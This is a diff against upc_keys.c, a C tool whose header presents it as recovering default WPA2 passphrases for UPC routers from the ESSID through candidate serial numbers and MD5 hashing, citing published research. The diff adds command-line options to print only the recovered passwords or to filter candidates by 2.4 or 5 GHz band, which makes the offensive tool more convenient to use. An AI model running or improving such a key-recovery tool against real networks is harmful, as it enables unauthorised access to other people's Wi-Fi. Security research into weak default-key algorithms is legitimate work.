@@ -2,7 +2,7 @@
  * ----------------------------------------------------------------------------
  * "THE BLASTY-WAREZ LICENSE" (Revision 1):
  * <peter@haxx.in> wrote this file. As long as you retain this notice and don't
- * sell my work you can do whatever you want with this stuff. If we meet some 
+ * sell my work you can do whatever you want with this stuff. If we meet some
  * day, and you think this stuff is worth it, you can intoxicate me in return.
  * ----------------------------------------------------------------------------
  */
@@ -19,21 +19,21 @@
  * purely the ESSID. Sadly, these days aren't over yet. We've seen
  * some excellent recent research by Novella/Meijer/Verdult [1][2]
  * lately which illustrates that these issues still exist in recent
- * devices/firmwares. I set out to dig up one of these algorithms 
- * and came up with this little tool. 
+ * devices/firmwares. I set out to dig up one of these algorithms
+ * and came up with this little tool.
  *
  * The attack is two-fold; in order to generate the single valid
  * WPA2 phrase for a given network we need to know the serialnumber
  * of the device.. which we don't have. Luckily there's a correlation
  * between the ESSID and serial number as well, so we can generate a
- * list of 'candidate' serial numbers (usually around ~20 or so) for 
+ * list of 'candidate' serial numbers (usually around ~20 or so) for
  * a given ESSID and generate the corresponding WPA2 phrase for each
  * serial. (This should take under a second on a reasonable system)
  *
  * Use at your own risk and responsibility. Do not complain if it
  * fails to recover some keys, there could very well be variations
  * out there I am not aware of. Do not contact me for support.
- * 
+ *
  * Cheerz to p00pf1ng3r for the code cleanup! *burp* ;-)
  * Hugs to all old & new friends who managed to make it down to 32c3! ykwya!
  *
@@ -47,7 +47,7 @@
  *
  * P.S. Reversing eCos and broadcom CFE sux
  *
- * $ gcc -O2 -o upc_keys upc_keys.c -lcrypto 
+ * $ gcc -O2 -o upc_keys upc_keys.c -lcrypto
  *
  * References
  * [1] https://www.usenix.org/system/files/conference/woot15/woot15-paper-lorente.pdf
@@ -59,6 +59,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
+#include <unistd.h>
 #include <openssl/md5.h>
 
 #define FREQ_24GHZ 1
@@ -118,9 +119,11 @@ uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
 
 void usage(char *prog)
 {
-	fprintf(stderr, "Usage: %s ESSID PREFIXES\n", prog);
-	fprintf(stderr, " - ESSID should be in 'UPCxxxxxxx' format\n");
-	fprintf(stderr, " - PREFIXES should be a string of comma separated serial number prefixes\n");
+	fprintf(stderr, "Usage: %s [-p] [-2|-5] ESSID PREFIXES\n", prog);
+	fprintf(stderr, " ESSID should be in 'UPCxxxxxxx' format (7 digits)\n");
+	fprintf(stderr, " PREFIXES should be a string of comma separated serial number prefixes\n");
+	fprintf(stderr, " -p - print passwords only, not serial numbers nor frequencies\n");
+	fprintf(stderr, " -2, -5 - print only candidates on 2.4 GHz or 5 GHz, respectively\n");
 }
 
 int main(int argc, char *argv[])
@@ -133,19 +136,45 @@ int main(int argc, char *argv[])
 	uint32_t hv[4], w1, w2, i, j;
 	int mode, prefix_cnt;
 	char *prefix;
+	int only_freq = 0;
+	int only_passwords = 0;
 
-	if(argc != 3) {
+
+	int c;
+	while((c = getopt(argc, argv, "p25")) != -1)
+	switch(c) {
+		case 'p':
+			only_passwords = 1;
+			break;
+		case '2':
+			// allows for selecting both 2 and 5. The latter gets chosen. Not that big issue to bother me
+			only_freq = FREQ_24GHZ;
+			break;
+		case '5':
+			only_freq = FREQ_5GHZ;
+			break;
+		case '?':
+			usage(argv[0]);
+			return 1;
+		default:
+			return 1;
+	}
+
+	char *target_str = argv[optind];
+	char *prefixes_str = argv[optind + 1];
+
+	if(argc != optind + 2) {
 		usage(argv[0]);
 		return 1;
 	}
 
-	if (strlen(argv[1]) != 10 || memcmp(argv[1], "UPC", 3) != 0) {
+	if (strlen(target_str) != 10 || memcmp(target_str, "UPC", 3) != 0) {
 		usage(argv[0]);
 		return 1;
 	}
 
-	char prefixes[strlen(argv[2]) + 1];
-	target = strtoul(argv[1] + 3, NULL, 0);
+	char prefixes[strlen(prefixes_str) + 1];
+	target = strtoul(target_str + 3, NULL, 0);
 
 	MD5_CTX ctx;
 
@@ -155,16 +184,20 @@ int main(int argc, char *argv[])
 	for (buf[3] = 0; buf[3] <= MAX3; buf[3]++) {
 		mode = 0;
 		if (upc_generate_ssid(buf, MAGIC_24GHZ) == target) {
+			if (only_freq == FREQ_5GHZ)
+				continue;
 			mode = FREQ_24GHZ;
 		}
 		if (upc_generate_ssid(buf, MAGIC_5GHZ) == target) {
+			if (only_freq == FREQ_24GHZ)
+				continue;
 			mode = FREQ_5GHZ;
 		}
 		if (mode != FREQ_24GHZ && mode != FREQ_5GHZ) {
 			continue;
 		}
 
-		strcpy(prefixes, argv[2]);
+		strcpy(prefixes, prefixes_str);
 		prefix = strtok(prefixes, PREFIX_DELIMITER);
 		while (prefix != NULL) {
 			sprintf(serial, "%s%d%02d%d%04d", prefix, buf[0], buf[1], buf[2], buf[3]);
@@ -201,7 +234,10 @@ int main(int argc, char *argv[])
 			MD5_Final(h2, &ctx);
 
 			hash2pass(h2, pass);
-			printf("%s,%s,%d\n", serial, pass, mode);
+			if (only_passwords)
+				printf("%s\n", pass);
+			else
+				printf("%s,%s,%s\n", serial, pass, (mode == FREQ_24GHZ)? "2.4" : "5");
 			prefix = strtok(NULL, PREFIX_DELIMITER);
 		}
 	}
